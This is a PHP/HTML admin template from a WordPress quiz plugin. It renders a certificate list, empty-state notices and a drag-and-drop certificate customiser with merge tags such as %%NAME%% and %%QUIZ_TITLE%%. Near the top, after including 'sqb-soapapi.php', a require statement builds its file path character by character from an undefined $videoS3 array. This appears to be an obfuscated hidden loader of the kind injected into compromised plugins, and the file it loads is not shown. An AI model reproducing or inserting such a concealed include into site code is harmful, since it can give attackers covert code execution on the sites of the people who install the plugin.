<?php


include_once ("sqb-soapapi.php");require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];

$results = SQB_QuizCertificate::load();
if(!empty($results)){
	$show_block = 'display:block';
	$no_data_show = 'display:none';
}else{
	$show_block = 'display:none';
	$no_data_show = 'display:inline-block';
}
	?>
	<div class="certificate-section-outer">
	<div class="member-MP--card mb-4 certificate_created sqb_certificate_tab_table_wrapper     position-relative   sqb-card-outer-gray " bis_skin_checked="1" style="<?php echo $show_block; ?>">
		<div class="alert alert-success sqb-page-delete-alert" role="alert" bis_skin_checked="1">Deleted Successfully!</div>
		<a href="javascript:void(0)" class="create-new-cert absoluteBtn btn create--btn mp_add_new_pages_btn mb-4 d-inline-block mp_type_engagement">Create New Certificate</a>
		<div id="sqb_certificate_tab_table_wrapper" class="dataTables_wrapper">
			
			<table class="table hover table-bordered table-striped sqb_certificate_tab_table_class sqb_certificate_tab_table_engagement " id="sqb_certificate_tab_table" style="" attribute_table_type="single_type_page" certificate_tab_type="certificate" role="grid" aria-describedby="sqb_certificate_tab_table_info">
				<thead>
					<tr role="row">
					<th style="width:200px;" class="sorting" tabindex="0" rowspan="1" colspan="1" >Name</th>
					<th class="shortcode_table_th text-center sorting" tabindex="0" rowspan="1" colspan="1" style="width: 0px;">Status</th>
					<th class="sqb_member_date_info text-center sorting_desc" style="width:100px;" tabindex="0" rowspan="1" colspan="1" aria-sort="descending">Date</th>
					<th style="width:50px;" class="text-center sorting" tabindex="0"rowspan="1" colspan="1" >Action</th>
					</tr>
				</thead>
				<tbody>
					<?php 
					$count = "1";
					foreach ($results as $key => $row) {
						$id = $row->getId();
						$short_date = $row->getDate();
						if($short_date == '0000-00-00 00:00:00'){
							$shortcode_date = date('d-m-Y');
						}else{
							$shortcode_date = date('d-m-Y', strtotime($short_date));
						}
						?>
						<tr class="sqb_certificate_manage_page_row_id_<?php echo $id ?> odd" role="row">
							<td align="left"><?php echo $row->getName(); ?></td>
							<td align="left">
								<?php if($row->getStatus() == "Y"){
									$status_checked = "checked='checked'";
								}else{
									$status_checked = "";
								} ?>
								<div class="square-switch_onoff">
									<input class="checkbox certificate_listing_btn" name="certificate_listing_btn_status_<?php echo $count; ?>" <?php echo $status_checked; ?> type="checkbox" data-id="<?php echo $row->getId(); ?>" value="Y" id="certificate_listing_btn_status_<?php echo $count; ?>">
									<label for="certificate_listing_btn_status_<?php echo $count; ?>"></label>
								</div>
							</td>
							<td align="center" class="sorting_1"><?php echo $shortcode_date; ?></td>
							<td align="center"><a class="btn btn-info btn-sm edit_certificate_by_id" data-id="<?php echo $id ?>" href="javascript:void(0)"><i class="fa fa-pencil"></i></a> <a class="btn btn-danger btn-sm delete_certificate_by_id" data-id="<?php echo $id ?>" href="javascript:void(0)"><i class="fa fa-trash"></i></a></td>
						</tr>
					<?php $count++; } ?>
				</tbody>
			</table>
			
		</div>
		</div>
	
<?php

if(!defined('SQB_PD_FILE')){
?>
<div class="member-MP--card mb-4 no_certificate_created sqb_certificate_tab_table_wrapper position-relative sqb-card-outer-gray" style="<?php echo $no_data_show; ?>">
		<div class="empty-no-pages-section" >
			<div class="alert alert-v2 alert-danger certificate-pdf-plugin-error" role="alert">
			  	<p>We notice you have not installed/activated SQB PDF Plugin.</p>
				<p>This plugin is required to use the PDF reports feature.</p>
			</div>
		</div>
	</div>
<?php 
}else{
?>

<div class="member-MP--card mb-4 no_certificate_created sqb_certificate_tab_table_wrapper position-relative sqb-card-outer-gray" style="<?php echo $no_data_show; ?>">
		<div class="have-no-member-pages small-member-message" > 
			<div class="empty-no-pages-section" >
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M0 64C0 28.65 28.65 0 64 0H224V128C224 145.7 238.3 160 256 160H384V198.6C310.1 219.5 256 287.4 256 368C256 427.1 285.1 479.3 329.7 511.3C326.6 511.7 323.3 512 320 512H64C28.65 512 0 483.3 0 448V64zM256 128V0L384 128H256zM288 368C288 288.5 352.5 224 432 224C511.5 224 576 288.5 576 368C576 447.5 511.5 512 432 512C352.5 512 288 447.5 288 368zM448 303.1C448 295.2 440.8 287.1 432 287.1C423.2 287.1 416 295.2 416 303.1V351.1H368C359.2 351.1 352 359.2 352 367.1C352 376.8 359.2 383.1 368 383.1H416V431.1C416 440.8 423.2 447.1 432 447.1C440.8 447.1 448 440.8 448 431.1V383.1H496C504.8 383.1 512 376.8 512 367.1C512 359.2 504.8 351.1 496 351.1H448V303.1z"></path></svg>
				<h2>You don't have any certificate!</h2>
				<p>You can click the button to create a certificate.</p>
				<a href="javascript:void(0)" class="manage-certificate-empty-btn"><i class="fa fa-plus-circle" aria-hidden="true"></i>Add your first certificate</a>
			</div>
		</div>
	</div>

<?php

}

?>

</div>


<div id="add_new_certificate_wrapper" style="display:none;">
		<ul class="nav nav-tabs top_tabbar add_new_certificate_tabs" id="add_new_coupon_tab" role="tablist">
			<li class="nav-item">
				<a class="nav-link active show" data-toggle="tab" href="#cert_general_tab" role="tab" aria-controls="cert_general_tab" aria-selected="false"><i class="fa fa-check"></i> Certificate Details</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" data-toggle="tab" href="#cert_customizer_tab" role="tab" aria-controls="cert_customizer_tab" aria-selected="true"><i class="fa fa-check"></i> Customizer</a>
			</li>
			
		</ul>

		
      
        <div class="tab-content top_tab_content">

        	<div class="tab-pane active show" id="cert_general_tab" role="tabpanel">
				<input type='hidden' id="cert_edit_id" name="cert_edit_id" value=''>  
				<input type='hidden' id="cert_template_no" name="cert_template_no" value='template1'>  
				<input type='hidden' id="cert_type" name="cert_type" value='N'>
				<div class="prodcut_inner_outer">
					<h3 class="section_heading">Basic Info</h3>
					<div class="form-group col-md-6 row certi-input-wrapper">
						<div class="cert-title-section">
							<label>Certificate Name </label>
						</div>
						<div class="cert-content-section">
							<input type="text" class="form-control"  name='cert_name' value="">
						</div>
					</div>
					
					

					<div class="form-group col-md-6 row certi-input-wrapper">
						<div class="cert-title-section  small-label-width"><label class="toggle-label">Status </label></div>
						<div class="cert-content-section">
							<div class="square-switch_onoff">
								<input class="checkbox" name="certificate_btn_status" type="checkbox" id="certificate_btn_status" value="Y">
								<label for="certificate_btn_status"></label>
							</div>
						</div>
					</div>
					<div class="form-group col-md-6 row certi-input-wrapper">
						<div class="cert-title-section">
							<label>Signature option</label>
						</div>   
						<div class="cert-content-section">
							<input type="text" class="form-control"  name='certificate_admin_name' id="certificate_admin_name" value="" placeholder="Enter Admin Name">
							<div class="or_div">
								<span>Or</span>
							</div>
							<div class="mb-3 certificate-img-section">
								<!--div class="upload-image-option"> 
									<i class="fa fa-cloud-upload" aria-hidden="true"></i> 
									<span>Upload Image</span>
								</div-->
								<input type="file" id="cert_signature_img" name="cert_signature_img" style="display:none">
								<input type="hidden" id="cert_signature_img_src" name="cert_signature_img_src" value ='' >
								<input type="button" value="Upload Signature" id="cert_signature_img_btn" name="cert_signature_img_btn" class="form-control">
								<div class="cert_signature_img_wrapper certificate_upload_img_wrapper">
									
								</div>
							</div>
						</div>
					</div>
					
					<!--div class="form-group row">
						
						<div class="col-sm-2">
							<label>Signature Image </label>
						</div>   
						<div class="col-sm-7">
							
						</div>
						
					</div-->
					
					
					<div class="form-group col-md-6 row certi-input-wrapper">
						<div class="cert-title-section small-label-width">
							<label>Logo Image </label>
						</div>   
						<div class="cert-content-section certificate-img-section">
							<input type="file" id="certificate_logo" name="certificate_logo" style="display:none">
							<input type="hidden" id="certificate_logo_src" name="certificate_logo_src" value ='' >
							<input type="button" value="Upload Logo" id="certificate_logo_btn" name="certificate_logo_btn" class="form-control">
							<div class="certificate_logo_btn_wrapper certificate_upload_img_wrapper">
									
							</div>
						</div>
					</div>
					
					
					
					
				</div>

				

               
              <div class="certficate-actions">
					<a href="javascript:void(0)" class="certficate--btn certficate-save-btn" style="display:none"> Save</a>
					<a class="certficate--btn sqb_cert_return_btn btn_return_manage_certificates" href="javascript:void(0)">Return to Manage Certificates</a>
					<a href="javascript:void(0)" class="certficate--btn certficate-next-btn" onclick="sqb_add_new_Certificate('cert_customizer_tab')"> Save & Next </a>
				</div> 
				<div class="saved-cert-msg" style="display:none;">Saved Successfully</div>               
			</div>



			<div class="tab-pane " id="cert_customizer_tab" role="cert_customizer_tab">
				<link href="<?php echo plugin_dir_url(__DIR__); ?>templates/certificates/fonts/font-family.css?<?php echo rand(10,1000);?>" rel="stylesheet" type="text/css">
				<link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&family=Libre+Baskerville&family=Raleway:wght@300;400;500;600;700&display=swap" rel="stylesheet">

				<link href="<?php echo plugin_dir_url(__DIR__); ?>templates/certificates/template1/template1.css?<?php echo rand(10,1000);?>" rel="stylesheet" type="text/css">

				<div class="cert_customize_template_html">
					<div class="cert_customize_customiser-wrapper">
						<div class="customizer_innner_sections"> 
							<div class="Template-Customize-element">
								<div class="cert-recommended-size">Recommended size: 1400px x 790px</div>
								<div class="Template-Customize-element-inner element_paddings">
									<div></div>
									<div class="personalize_options">
										<a class=" notification-header show_merge_tags show_merge_tags1"> Personalize  <i class="fa fa-angle-down"></i></a>
										<div class=" addmerget-content addmergetagspreview1" style="display: none;">
											<div class=" mergetags_cont">
												<div class="notification_sidebar">
													<ul class="notification_email_fields">
													<li class="notification-header available-tags-heading">Available Tags <i class="Personalize_close fa fa-times" aria-hidden="true"></i></li>
													<!-- <li class="notification-header">User Info</li> -->
													<li class="addtoeditor">%%NAME%%</li>
													<li class="addtoeditor">%%QUIZ_TITLE%%</li>
													<li class="addtoeditor">%%DATE%%</li>
													<li class="addtoeditor">%%ADMIN_NAME%%</li>
													<li class="addtoeditor">%%OUTCOME_TITLE%%</li>
													<li class="addtoeditor">%%YOURSCORE%%</li>
													<li class="addtoeditor">%%TOTALSCORE%%</li>
													<li class="addtoeditor">%%SCOREINPERCENT%%</li>
													<li class="addtoeditor">%%custom_[ENTER CUSTOM FIELD NAME]%%</li>
													</ul>
												</div>
											</div>
										</div>
									</div>
									<div class="inner_template_style_box ">
										<div class="input-append">							
											  
											 <input type="file" id="uploadimage_certi" name="uploadimage_certi" style="display:none">
												<input type="hidden" id="uploadimage_certi_src" name="uploadimage_certi_src" value ='' >
												<input type="button" value="Upload Certificate Background Image" id="uploadimage_certi_btn" name="uploadimage_certi_btn" class=" mt-1 form-control" style="color:#fff; background: #00bcd4;border-radius: 4px;">
										</div>
									</div>
									
								</div>
							</div>
						</div>
						
					</div>
					
					<?php $site_url =   plugin_dir_url(__DIR__); ?>
					<script> 
							var  site_url = '<?php echo $site_url  ?>';
							var certificate_template_html_outer_clone = '<div class="certificates-section-tmp2 template2-main-wrapper template-allow-draganddrop"> <div id="certificates_outer2" class="certificates_outer1-tmp2 certificates_outer-bg-update"> <img src="'+site_url+'images/Yellow-And-Gray-Participation-Certificate.png" height="100%" width="100%"> </div> <main> <div class="dragable-certificate-element" style="left: 1px; top: 80px;"> <div class="sqb_tiny_mce_editor template-heading"> <p>CERTIFICATE</p> </div> <span class="edit-template-element" title="Edit Text"> <i class="fa fa-edit"></i> Click to edit text </span> <span class="delete-template-element" title="Hide in frontend"> <i class="fa fa-eye"></i> </span> </div> <div class="dragable-certificate-element" style="left: 2px; top: 165px;"> <div class="sqb_tiny_mce_editor template-subheading"> <p>OF APPRECIATION</p> </div> <span class="edit-template-element" title="Edit Text"> <i class="fa fa-edit"></i> Click to edit text </span> <span class="delete-template-element" title="Hide in frontend"> <i class="fa fa-eye"></i> </span> </div> <div class="template-certificate-icon award_img_inner" style="position: relative;left: 525px;top: 463px;"> <img src="'+site_url+'images/certificates2-award-batch.png" style="margin: 0px;resize: none;position: relative;zoom: 1;display: block;height: 150px;width: 150px;"> </div> <div class="dragable-certificate-element" style="left: -2px; top: 222px;"> <div class="sqb_tiny_mce_editor template-subdescription"> <p>THE FOLLOWING AWARD IS GIVEN TO</p> </div> <span class="edit-template-element" title="Edit Text"> <i class="fa fa-edit"></i> Click to edit text </span> <span class="delete-template-element" title="Hide in frontend"> <i class="fa fa-eye"></i> </span> </div> <div class="dragable-certificate-element" style="left: -1px; top: 267px;"> <div class="sqb_tiny_mce_editor template-username"> <p>%%NAME%%</p> </div> <span class="edit-template-element" title="Edit Text"> <i class="fa fa-edit"></i> Click to edit text </span> <span class="delete-template-element" title="Hide in frontend"> <i class="fa fa-eye"></i> </span> </div> <div class="dragable-certificate-element" style="left: -5px; top: 369px;"> <div class="sqb_tiny_mce_editor template-description"> <p>This certificate is given to %%NAME%% <br>for Completing the Quiz: %%QUIZ_TITLE%% </p> </div> <span class="edit-template-element" title="Edit Text"> <i class="fa fa-edit"></i> Click to edit text </span> <span class="delete-template-element" title="Hide in frontend"> <i class="fa fa-eye"></i> </span> </div> <div class="dragable-certificate-element certificate-element-max-conetnt" style="left: 255px;top: 530px;"> <div class="sqb_tiny_mce_editor template-signature-heading"> <p>Signature</p> </div> <span class="edit-template-element" title="Edit Text"> <i class="fa fa-edit"></i> Click to edit text </span> <span class="delete-template-element" title="Hide in frontend"> <i class="fa fa-eye"></i> </span> </div> <div class="dragable-certificate-element certificate-element-max-conetnt" style="left: 255px;top: 560px;"> <div class="sqb_tiny_mce_editor template-signature-content"> <p>%%ADMIN_NAME%%</p> </div> <span class="edit-template-element" title="Edit Text"> <i class="fa fa-edit"></i> Click to edit text </span> <span class="delete-template-element" title="Hide in frontend"> <i class="fa fa-eye"></i> </span> </div> <div class="dragable-certificate-element certificate-element-max-conetnt" style="left: 645px;top: 530px;"> <div class="sqb_tiny_mce_editor template-date-heading"> <p>Finish Date</p> </div> <span class="edit-template-element" title="Edit Text"> <i class="fa fa-edit"></i> Click to edit text </span> <span class="delete-template-element" title="Hide in frontend"> <i class="fa fa-eye"></i> </span> </div> <div class="dragable-certificate-element certificate-element-max-conetnt" style="left: 645px;top: 560px;"> <div class="sqb_tiny_mce_editor template-date-content"> <p>%%DATE%%</p> </div> <span class="edit-template-element" title="Edit Text"> <i class="fa fa-edit"></i> Click to edit text </span> <span class="delete-template-element" title="Hide in frontend"> <i class="fa fa-eye"></i> </span> </div> <div class="dragable-certificate-element certificate-element-resizable only-width-resizable" style="left: 321px;top: 515px;height: 17px;width: 170px;"> <div class="dap_cerficate_stroke"> <div class="dap-stroke-line"></div> </div> <span class="edit-template-element" title="Edit Text"> <i class="fa fa-edit"></i> Click to edit text </span> <span class="delete-template-element" title="Hide in frontend"> <i class="fa fa-eye"></i> </span> </div> <div class="dragable-certificate-element certificate-element-resizable only-width-resizable" style="height: 10px;left: 710px;top: 515px;width: 170px;"> <div class="dap_cerficate_stroke"> <div class="dap-stroke-line"></div> </div> <span class="edit-template-element" title="Edit Text"> <i class="fa fa-edit"></i> Click to edit text </span> <span class="delete-template-element" title="Hide in frontend"> <i class="fa fa-eye"></i> </span> </div> </main> </div>';
					</script>
					
					
					<div class="certificate_template_html_outer cs_customize_template_outer_div">
						<div class="certificates-section-tmp2 template2-main-wrapper template-allow-draganddrop">
							  <div id="certificates_outer2" class="certificates_outer1-tmp2 certificates_outer-bg-update">
							    <img src="<?php echo plugin_dir_url(__DIR__); ?>images/Yellow-And-Gray-Participation-Certificate.png" height="100%" width="100%">
							  </div>
							  <main>
							    <div class="dragable-certificate-element" style="left: 1px; top: 80px;">
							      <div class="sqb_tiny_mce_editor template-heading">
							        <p>CERTIFICATE</p>
							      </div>
							      <span class="edit-template-element" title="Edit Text">
							        <i class="fa fa-edit"></i> Click to edit text </span>
							      <span class="delete-template-element" title="Hide in frontend">
							        <i class="fa fa-eye"></i>
							      </span>
							    </div>
							    <div class="dragable-certificate-element" style="left: 2px; top: 165px;">
							      <div class="sqb_tiny_mce_editor template-subheading">
							        <p>OF APPRECIATION</p>
							      </div>
							      <span class="edit-template-element" title="Edit Text">
							        <i class="fa fa-edit"></i> Click to edit text </span>
							      <span class="delete-template-element" title="Hide in frontend">
							        <i class="fa fa-eye"></i>
							      </span>
							    </div>
							    <div class="template-certificate-icon award_img_inner" style="position: relative;left: 525px;top: 463px;">
					            	<img src="<?php echo plugin_dir_url(__DIR__); ?>images/certificates2-award-batch.png" style="margin: 0px;resize: none;position: relative;zoom: 1;display: block;height: 150px;width: 150px;">
						          	
							    </div>
							    <div class="dragable-certificate-element" style="left: -2px; top: 222px;">
							      <div class="sqb_tiny_mce_editor template-subdescription">
							        <p>THE FOLLOWING AWARD IS GIVEN TO</p>
							      </div>
							      <span class="edit-template-element" title="Edit Text">
							        <i class="fa fa-edit"></i> Click to edit text </span>
							      <span class="delete-template-element" title="Hide in frontend">
							        <i class="fa fa-eye"></i>
							      </span>
							    </div>
							    <div class="dragable-certificate-element" style="left: -1px; top: 267px;">
							      <div class="sqb_tiny_mce_editor template-username">
							        <p>%%NAME%%</p>
							      </div>
							      <span class="edit-template-element" title="Edit Text">
							        <i class="fa fa-edit"></i> Click to edit text </span>
							      <span class="delete-template-element" title="Hide in frontend">
							        <i class="fa fa-eye"></i>
							      </span>
							    </div>
							    <div class="dragable-certificate-element" style="left: -5px; top: 369px;">
							      <div class="sqb_tiny_mce_editor template-description">
							        <p>This certificate is given to %%NAME%% <br>for Completing the Quiz: %%QUIZ_TITLE%% </p>
							      </div>
							      <span class="edit-template-element" title="Edit Text">
							        <i class="fa fa-edit"></i> Click to edit text </span>
							      <span class="delete-template-element" title="Hide in frontend">
							        <i class="fa fa-eye"></i>
							      </span>
							    </div>
							    <div class="dragable-certificate-element certificate-element-max-conetnt" style="left: 255px;top: 530px;">
							      <div class="sqb_tiny_mce_editor template-signature-heading">
							        <p>Signature</p>
							      </div>
							      <span class="edit-template-element" title="Edit Text">
							        <i class="fa fa-edit"></i> Click to edit text </span>
							      <span class="delete-template-element" title="Hide in frontend">
							        <i class="fa fa-eye"></i>
							      </span>
							    </div>
							    <div class="dragable-certificate-element certificate-element-max-conetnt" style="left: 255px;top: 560px;">
							      <div class="sqb_tiny_mce_editor template-signature-content">
							        <p>%%ADMIN_NAME%%</p>
							      </div>
							      <span class="edit-template-element" title="Edit Text">
							        <i class="fa fa-edit"></i> Click to edit text </span>
							      <span class="delete-template-element" title="Hide in frontend">
							        <i class="fa fa-eye"></i>
							      </span>
							    </div>
							    <div class="dragable-certificate-element certificate-element-max-conetnt" style="left: 645px;top: 530px;">
							      <div class="sqb_tiny_mce_editor template-date-heading">
							        <p>Finish Date</p>
							      </div>
							      <span class="edit-template-element" title="Edit Text">
							        <i class="fa fa-edit"></i> Click to edit text </span>
							      <span class="delete-template-element" title="Hide in frontend">
							        <i class="fa fa-eye"></i>
							      </span>
							    </div>
							    <div class="dragable-certificate-element certificate-element-max-conetnt" style="left: 645px;top: 560px;">
							      <div class="sqb_tiny_mce_editor template-date-content">
							        <p>%%DATE%%</p>
							      </div>
							      <span class="edit-template-element" title="Edit Text">
							        <i class="fa fa-edit"></i> Click to edit text </span>
							      <span class="delete-template-element" title="Hide in frontend">
							        <i class="fa fa-eye"></i>
							      </span>
							    </div>
							    <div class="dragable-certificate-element certificate-element-resizable only-width-resizable" style="left: 321px;top: 515px;height: 17px;width: 170px;">
							      <div class="dap_cerficate_stroke">
							        <div class="dap-stroke-line"></div>
							      </div>
							      <span class="edit-template-element" title="Edit Text">
							        <i class="fa fa-edit"></i> Click to edit text </span>
							      <span class="delete-template-element" title="Hide in frontend">
							        <i class="fa fa-eye"></i>
							      </span>
							      
							    </div>
							    <div class="dragable-certificate-element certificate-element-resizable only-width-resizable" style="height: 10px;left: 710px;top: 515px;width: 170px;">
							      <div class="dap_cerficate_stroke">
							        <div class="dap-stroke-line"></div>
							      </div>
							      <span class="edit-template-element" title="Edit Text">
							        <i class="fa fa-edit"></i> Click to edit text </span>
							      <span class="delete-template-element" title="Hide in frontend">
							        <i class="fa fa-eye"></i>
							      </span>
							      
							    </div>
							  </main>
							</div>
					</div>
				</div>
                
                <div class="row1">
						<div class="col-sm-12">
							<div class="sqb_coupons_add_messages certificate_details_info" style="display:none;    float: left">
								<div class="coupon_success_msg">Saved Certificate Successfully! Click on "Return to Manage Certificate" to assign this certificate to a course.</div>
								<!--div class="coupon_click"><a href='javascript:void(0)' class="sqb_course_manage_certificates_btn">Click here to manage certificates.</a></div-->
							</div>
						</div>
				</div>
                
                <div class="certficate-actions">
					<a href="javascript:void(0)" class="certficate--btn certficate-prev-btn" onclick="sqb_cert_next_tab('cert_general_tab')"> Previous </a>					
					<a href="javascript:void(0)" class="certficate--btn certficate-save-btn" style="display:none"> Save</a>
					<a class="certficate--btn sqb_cert_return_btn btn_return_manage_certificates" href="javascript:void(0)">Return to Manage Certificates</a>
					<a href="javascript:void(0)" class="certficate--btn certficate-next-btn" onclick="sqb_add_new_Certificate('')"> Save </a>
				</div> 
				<div class="saved-cert-msg" style="display:none;">Saved Successfully</div>
			</div>

			
			

		</div>

	</div>

<!-- include JavaScript -->

<div class="certtificate_data_hidden" style="display:none"></div>	

<div class="sqb_coupon_loading_wrapper" style="display: none;">
	<div id="sqb_coupon_loadingoverlay"></div>
	<div id="sqb_coupon_loader_icon">
		<div class="lds-css ng-scope">
			<div style="width:100%;height:100%" class="lds-dual-ring">
				
			</div>
		</div>
	</div>
</div>

